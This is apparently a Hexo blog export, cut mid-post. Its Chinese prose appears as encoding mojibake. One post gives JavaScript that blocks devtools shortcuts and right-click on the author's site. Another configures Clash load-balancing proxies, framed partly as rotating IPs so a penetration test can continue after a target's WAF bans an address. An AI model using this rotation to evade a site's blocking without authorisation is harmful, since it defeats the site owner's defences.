      <url>/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>ç½‘ç«™ç¦ç”¨è°ƒè¯•æ¨¡å¼æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç«™å®‰å…¨æªæ–½ï¼Œæ—¨åœ¨é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨å¼€å‘å·¥å…·ï¼ˆå¦‚Chrome DevToolsï¼‰å¯¹ç½‘ç«™è¿›è¡Œæ¶æ„æ”»å‡»æˆ–çªƒå–æ•æ„Ÿä¿¡æ¯ã€‚ç¦ç”¨è°ƒè¯•æ¨¡å¼é€šè¿‡é™åˆ¶æˆ–ç¦æ­¢å¼€å‘å·¥å…·çš„ä½¿ç”¨ï¼Œå¢å¼ºç½‘ç«™çš„å®‰å…¨é˜²æŠ¤ã€‚</p><p>å®ç°ç½‘ç«™ç¦ç”¨è°ƒè¯•æ¨¡å¼çš„æŠ€æœ¯æ–¹æ³•æœ‰å¤šç§ã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯åœ¨ç½‘é¡µä»£ç ä¸­æ’å…¥JavaScriptä»£ç æ¥æ£€æµ‹æ˜¯å¦æ‰“å¼€äº†å¼€å‘å·¥å…·ã€‚å¦‚æœæ£€æµ‹åˆ°å¼€å‘å·¥å…·è¢«æ‰“å¼€ï¼Œåˆ™ä¼šç¦ç”¨é¡µé¢çš„ä¸€äº›åŠŸèƒ½ï¼Œæˆ–å°†é¡µé¢é‡å®šå‘åˆ°å…¶ä»–é¡µé¢ã€‚è¿™ç§æ–¹æ³•çš„å®ç°ç›¸å¯¹ç®€å•ï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€å®šçš„è¢«ç»•è¿‡é£é™©ã€‚</p><p>å¦ä¸€ç§æ›´ä¸ºå®‰å…¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨æœåŠ¡å™¨ç«¯çš„æŠ€æœ¯æ¥æ£€æµ‹æ˜¯å¦æ‰“å¼€äº†å¼€å‘å·¥å…·ã€‚æœåŠ¡å™¨ç«¯å¯ä»¥æ£€æµ‹å®¢æˆ·ç«¯è¯·æ±‚å¤´ä¸­çš„User-Agentå­—æ®µï¼Œä»¥è¯†åˆ«æµè§ˆå™¨å’Œå¼€å‘å·¥å…·çš„ç±»å‹ã€‚å¦‚æœæ£€æµ‹åˆ°è¯·æ±‚å¤´ä¸­åŒ…å«å¼€å‘å·¥å…·çš„ä¿¡æ¯ï¼ŒæœåŠ¡å™¨ç«¯å¯ä»¥é‡‡å–ç›¸åº”çš„æªæ–½æ¥ç¦æ­¢å¯¹ç½‘ç«™è¿›è¡Œæ”»å‡»ã€‚</p><p>æœ¬æ–‡ä¸»è¦ä»‹ç»é€šè¿‡ç½‘ç«™ä¸­å¼•å…¥JavaScriptä»£ç ï¼Œç¦æ­¢æ”»å‡»è€…æ‰“å¼€DEvtoolså®ç°ã€‚</p><h1 id="0x01-å®ç°æ­¥éª¤"><a href="#0x01-å®ç°æ­¥éª¤" class="headerlink" title="0x01 å®ç°æ­¥éª¤"></a>0x01 å®ç°æ­¥éª¤</h1><h2 id="æ–°å»ºbandev-jsæ–‡ä»¶"><a href="#æ–°å»ºbandev-jsæ–‡ä»¶" class="headerlink" title="æ–°å»ºbandev.jsæ–‡ä»¶"></a>æ–°å»ºbandev.jsæ–‡ä»¶</h2><p>åœ¨themeå¯¹åº”ä¸»é¢˜ä¸‹çš„æ–°å»º  source&#x2F;js&#x2F;bandev.jsï¼ˆè‡ªè¡Œä¿®æ”¹æç¤ºæ–‡å­—ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç¦æ­¢å³é”®</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;event.returnValue=false;&quot;</span>) <span class="comment">//ç¦ç”¨å³é”®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æŒ‰é”®</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;F12è¢«ç¦ç”¨&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+shift+iè¢«ç¦ç”¨&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+sè¢«ç¦ç”¨&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+pè¢«ç¦ç”¨&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°ç„¶åå¼ºè¡Œè¿›å…¥</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// è¿™é‡Œæˆ‘åšçš„æ˜¯è·³è½¬é¦–é¡µï¼Œå¯ä»¥æ ¹æ®å®é™…éœ€è¦è¿›è¡Œå…¶ä»–é™åˆ¶</span></span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// è·å–å½“å‰åŸŸå</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªæ–¹é¢çš„æ€è·¯ï¼š</p><p>1ã€ç¦æ­¢å³é”®</p><p>2ã€ç¦æ­¢ç‰¹å®šæŒ‰é”®</p><p>3ã€ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥</p><p>ä¸‹é¢å…·ä½“è¯´æ˜è¿™ä¸‰ä¸ªçš„å®ç°æ–¹æ³•ï¼š</p><h2 id="ç¦æ­¢å³é”®"><a href="#ç¦æ­¢å³é”®" class="headerlink" title="ç¦æ­¢å³é”®"></a>ç¦æ­¢å³é”®</h2><p>1ã€æœ€ç®€å•çš„ä¸€è¡Œä»£ç æå®šï¼šdocument.oncontextmenuæ˜¯ä¸€ä¸ªäº‹ä»¶å¤„ç†å™¨ï¼Œå®ƒä¼šåœ¨ç”¨æˆ·å°è¯•åœ¨æ–‡æ¡£ä¸Šæ‰§è¡Œå³é”®ç‚¹å‡»ï¼ˆå³æ‰“å¼€ä¸Šä¸‹æ–‡èœå•ï¼‰æ—¶è¢«è§¦å‘ï¼Œè°ƒç”¨å‡½æ•°ï¼Œå°†event.returnValueè®¾ç½®ä¸ºfalseé»˜è®¤é˜»æ­¢æ­¤äº‹ä»¶çš„å‘ç”Ÿã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = new Function(&quot;event.returnValue=false;&quot;) //ç¦ç”¨å³é”®</span><br></pre></td></tr></table></figure><p>2ã€ä½†éœ€è¦æ³¨æ„ï¼Œä¸Šé¢çš„ä»£ç é€‚ç”¨äºæ—§çš„æµè§ˆå™¨ï¼ˆå¦‚IEï¼‰ç‰ˆæœ¬ï¼Œåœ¨æ›´ç°ä»£çš„æµè§ˆå™¨ï¼ˆå¦‚Chrome, Firefoxç­‰ï¼‰ä¸­ï¼Œè¿™ç§æ–¹å¼å¯èƒ½ä¸ä¼šèµ·ä½œç”¨ã€‚å¯¹äºæ›´ç°ä»£çš„æµè§ˆå™¨ï¼Œé€šå¸¸ä¼šä½¿ç”¨event.preventDefault()æ–¹æ³•æ¥é˜»æ­¢é»˜è®¤è¡Œä¸ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = function(event) &#123;  </span><br><span class="line">    event.preventDefault();  </span><br><span class="line">    return false;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ç¦æ­¢ç‰¹å®šæŒ‰é”®"><a href="#ç¦æ­¢ç‰¹å®šæŒ‰é”®" class="headerlink" title="ç¦æ­¢ç‰¹å®šæŒ‰é”®"></a>ç¦æ­¢ç‰¹å®šæŒ‰é”®</h2><p>é˜²æ­¢F12å’Œshift+ctrl+iè°ƒèµ·å¼€å‘è€…å·¥å…·ï¼›å¹¶ä¸”ç¦ç”¨ctrl+så’Œctrl+sï¼Œé˜²æ­¢å¯¹ç½‘é¡µå†…å®¹æœ¬åœ°ä¿å­˜</p><p>ç›‘å¬æŒ‰é”®äº‹ä»¶ï¼Œå¯¹ä¸Šè¿°çš„æŒ‰ä»¶è¿›è¡Œç›‘å¬ï¼Œå¦‚æœç›‘å¬åˆ°è®¾ç½®event.returnValue &#x3D; falseã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ç›‘å¬æŒ‰é”®</span><br><span class="line">document.onkeydown = function () &#123;</span><br><span class="line">    // f12</span><br><span class="line">    if (window.event &amp;&amp; window.event.keyCode == 123) &#123;</span><br><span class="line">        alert(&quot;F12è¢«ç¦ç”¨&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+shift+i</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.shiftKey &amp;&amp; window.event.keyCode == 73) &#123;</span><br><span class="line">        alert(&quot;ctrl+shift+iè¢«ç¦ç”¨&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+s</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 83) &#123;</span><br><span class="line">        alert(&quot;ctrl+sè¢«ç¦ç”¨&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">     // ctrl+p</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 80) &#123;</span><br><span class="line">        alert(&quot;ctrl+pè¢«ç¦ç”¨&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥"><a href="#ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥" class="headerlink" title="ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥"></a>ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥</h2><p>å¦‚æœç”¨æˆ·åœ¨å·¥å…·æ è°ƒèµ·å¼€å‘è€…å·¥å…·ï¼Œé‚£ä¹ˆåˆ¤æ–­æµè§ˆå™¨çš„å¯è§†é«˜åº¦å’Œå¯è§†å®½åº¦æ˜¯å¦æœ‰æ”¹å˜ï¼Œå¦‚æœ‰æ”¹å˜åˆ™å…³é—­æœ¬é¡µé¢ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°ç„¶åå¼ºè¡Œè¿›å…¥</span><br><span class="line">function a() &#123;</span><br><span class="line">    var domain = window.location.host;// è·å–å½“å‰åŸŸå</span><br><span class="line">    window.location.href = &quot;https://&quot; + domain;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerHeight - window.innerHeight &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerWidth - window.innerWidth &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç¦æ­¢å³é”®</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;  </span><br><span class="line">    event.<span class="title function_">preventDefault</span>();  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æŒ‰é”®</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¦æ­¢å…ˆæ‰“å¼€æ§åˆ¶å°ç„¶åå¼ºè¡Œè¿›å…¥</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;è¯·å…³é—­æ§åˆ¶å°åå†è®¿é—®æœ¬ç«™ï¼ï¼ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// è·å–å½“å‰åŸŸå</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hexoä¸€é”®ä¸‰è¿åï¼ŒæŸ¥çœ‹æ•ˆæœ</p><p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><ul><li>å³é”®ã€ç‰¹å®šæŒ‰é”®æ‰“å¼€Devtoolsï¼Œæ— ååº”</li><li>å…ˆæ‰“å¼€æ§åˆ¶å°åå¼ºåˆ¶è¿›å…¥ï¼Œä¼šå¼¹çª—ï¼Œå¼ºåˆ¶å…³é—­devtools</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091645594.png" alt="image-20240409164540557">  </p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åšå®¢å®‰å…¨ </tag>
            
            <tag> ç¦ç”¨è°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clashé…ç½®è´Ÿè½½å‡è¡¡</title>
      <link href="/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨ä½¿ç”¨ClashèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™è§‰å¾—è‡ªå·±çš„èŠ‚ç‚¹ç½‘é€Ÿè·‘ä¸æ»¡ï¼Œé€Ÿåº¦ä¸å¤Ÿå¿«ã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç€ä½¿ç”¨è´Ÿè½½å‡è¡¡ï¼Œæ¥è®©èŠ‚ç‚¹çš„ç½‘é€Ÿæ‹‰æ»¡ã€‚åœ¨æ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œç›®æ ‡ç«™ç‚¹é‚£è¾¹æœ‰WAFï¼Œæ“ä½œæ²¡å‡ åˆ†é’Ÿå°±è¢«å®¢æˆ·æŠŠIP banæ‰äº†ï¼Œå¦‚æœä½¿ç”¨clashæŒ‚ä¸Šæ¸¸ä»£ç†ï¼Œå¯ä»¥åˆ‡æ¢IPï¼Œä½†æ¯æ¬¡è¢«å°ä¸€ä¸ªå°±åˆ‡æ¢ä¸€æ¬¡ï¼Œå¤ªéº»çƒ¦ï¼Œè¿™å—å°±å¯ä»¥ä½¿ç”¨è´Ÿè½½å‡è¡¡çš„æ–¹å¼ï¼Œä¸€ä¸ªIPè¢«banåï¼Œç›´æ¥è‡ªåŠ¨åˆ‡æ¢ä¸‹ä¸€ä¸ªIPã€‚ã€‚ã€‚</p><h2 id="0x01-å‡†å¤‡ææ–™"><a href="#0x01-å‡†å¤‡ææ–™" class="headerlink" title="0x01 å‡†å¤‡ææ–™"></a>0x01 å‡†å¤‡ææ–™</h2><ul><li>Clash èŠ‚ç‚¹é…ç½®</li><li>åŸºäºåŸç‰ˆ Clashã€Clash Premium æˆ– Clash Meta çš„å®¢æˆ·ç«¯</li></ul><h2 id="0x02-é…ç½®æ­¥éª¤"><a href="#0x02-é…ç½®æ­¥éª¤" class="headerlink" title="0x02 é…ç½®æ­¥éª¤"></a>0x02 é…ç½®æ­¥éª¤</h2><h3 id="CFW-Parsers"><a href="#CFW-Parsers" class="headerlink" title="CFW Parsers"></a>CFW Parsers</h3><ol><li>æ‰“å¼€ Clash For Windowsï¼Œè½¬åˆ°â€œè®¾ç½®â€â†’â€œé…ç½®â€ã€‚ç‚¹å‡»â€œé¢„å¤„ç†é…ç½®â€å³è¾¹çš„â€œEditâ€æŒ‰é’®ï¼š</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023662.png" alt="image-20240410102323613">  </p><ol start="2"><li>åœ¨å†…ç½®ç¼–è¾‘å™¨ä¸­ï¼Œç²˜è´´ä»¥ä¸‹å†…å®¹å¹¶ä¿å­˜</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parsers:</span><br><span class="line">  - reg: &#x27;slbable$&#x27;</span><br><span class="line">    yaml:</span><br><span class="line">      append-proxy-groups:</span><br><span class="line">        - name: âš–ï¸ è´Ÿè½½å‡è¡¡-æ•£åˆ—</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: consistent-hashing</span><br><span class="line">        - name: âš–ï¸ è´Ÿè½½å‡è¡¡-è½®è¯¢</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: round-robin</span><br><span class="line">      commands:</span><br><span class="line">        - proxy-groups.âš–ï¸ è´Ÿè½½å‡è¡¡-æ•£åˆ—.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+âš–ï¸ è´Ÿè½½å‡è¡¡-æ•£åˆ—</span><br><span class="line">        - proxy-groups.âš–ï¸ è´Ÿè½½å‡è¡¡-è½®è¯¢.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+âš–ï¸ è´Ÿè½½å‡è¡¡-è½®è¯¢</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023242.png" alt="image-20240410102331198">  </p><ol start="3"><li>ä¸ºäº†é˜²æ­¢æ­£å¸¸è®¢é˜…è¢«æ±¡æŸ“ï¼Œè¯·è‡ªè¡Œä¿®æ”¹è®¢é˜…åœ°å€ï¼Œåœ¨å…¶åé¢åŠ ä¸Š#slbableå³å¯ä½¿ç”¨è´Ÿè½½å‡è¡¡</li></ol><p>åœ¨è®¢é˜…åœ°å€åé¢æ‰‹åŠ¨è¾“å…¥ï¼š#slbable</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023573.png" alt="image-20240410102338531">  </p><ol start="4"><li>ç‚¹å‡»ç¡®å®šå›åˆ°ã€é…ç½®ã€‘ç•Œé¢ï¼Œå³å‡»é…ç½®é¡¹é€‰æ‹©ã€é¢„å¤„ç†é…ç½®ã€‘ã€‚å¦‚æœå‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œå°±ä»£è¡¨è´Ÿè½½å‡è¡¡è§„åˆ™å·²åŠ è½½æˆåŠŸï¼š</li></ol><p>å‡ºç° reg(slbable$) ä»£è¡¨è´Ÿè½½å‡è¡¡è§„åˆ™åŠ è½½æˆåŠŸ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023311.png" alt="image-20240410102344268">  </p><ol start="5"><li>æ­¤æ—¶ï¼ŒClash å·²ç»é…ç½®å¥½çš„èŠ‚ç‚¹ä¹‹é—´çš„è´Ÿè½½å‡è¡¡è§„åˆ™ã€‚åœ¨ã€ä»£ç†ã€‘-ã€è§„åˆ™ã€‘ä¸­å‡ºç°äº†ã€è´Ÿè½½å‡è¡¡-æ•£åˆ—ã€‘å’Œã€è´Ÿè½½å‡è¡¡-è½®è¯¢ã€‘çš„é€‰é¡¹ï¼š</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023529.png" alt="image-20240410102350484">  </p><p>æ–°å¢çš„<strong>ã€è´Ÿè½½å‡è¡¡-æ•£åˆ—ã€‘</strong>å’Œ<strong>ã€è´Ÿè½½å‡è¡¡-è½®è¯¢ã€‘</strong>é€‰é¡¹å¡</p><p>åœ¨åªéœ€è¦é‡å¯ Clash å¹¶é€‰æ‹©å¥½ä»£ç†ï¼Œå°±å¯ä»¥å®ç°è´Ÿè½½å‡è¡¡æ•ˆæœã€‚</p><ol start="6"><li>é‡å¯ä¹‹åï¼Œæ‰“å¼€ã€ä»£ç†ã€‘-ã€è§„åˆ™ã€‘ï¼Œå¹¶ç‚¹å‡»é€‰æ‹©ã€è´Ÿè½½å‡è¡¡-è½®è¯¢æ¨¡å¼ã€‘ã€‚ç„¶åå³å‡»çª—å£å³ä¸‹è§’çš„Clashå°è“çŒ«å›¾æ ‡ï¼Œåƒå³ä¾§å›¾ç‰‡è¿™æ ·é€‰æ‹©ã€‚é€‰æ‹©ã€ç³»ç»Ÿä»£ç†ã€‘ã€ç„¶åä»£ç†æ¨¡å¼é€‰æ‹©ã€è§„åˆ™ã€‘ã€‚</li></ol><h3 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h3><p>å…³äº<strong>ç³»ç»Ÿä»£ç†</strong>ã€<strong>TUNæ¨¡å¼</strong>ã€<strong>æ··åˆé…ç½®</strong>è¿™äº›ï¼Œæ–°æ‰‹å¯ä»¥è¿™ä¹ˆç†è§£ï¼š</p><ul><li>ç³»ç»Ÿä»£ç†ï¼šå°±æ˜¯æµè§ˆé¡µé¢ã€çœ‹è§†é¢‘ä¹‹ç±»çš„èµ°ä»£ç†ï¼ˆé­”æ³•ä¸Šç½‘ï¼‰ã€‚æ¸¸æˆã€åº”ç”¨ä¹‹ç±»çš„ä¸ä¼šèµ°ä»£ç†</li><li>TUN æ¨¡å¼ï¼šå°±æ˜¯æ— è®ºç½‘é¡µã€æ¸¸æˆã€åº”ç”¨è¿˜æ˜¯ä»€ä¹ˆå…¨éƒ¨æŒ‰ç…§è§„åˆ™èµ°ä»£ç†ï¼ˆé­”æ³•ä¸Šç½‘ï¼‰ã€‚</li><li>æ··åˆæ¨¡å¼ï¼šå°±æ˜¯ä¸Šé¢ä¸¤ä¸ªæ··ä¸€èµ·ç”¨ã€‚</li></ul><h2 id="0x03-æµ‹è¯•"><a href="#0x03-æµ‹è¯•" class="headerlink" title="0x03 æµ‹è¯•"></a>0x03 æµ‹è¯•</h2><p>ä½¿ç”¨Pythonè„šæœ¬æ¥ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span>,</span><br><span class="line">           <span class="string">&#x27;https&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">ips = []</span><br><span class="line"><span class="comment"># 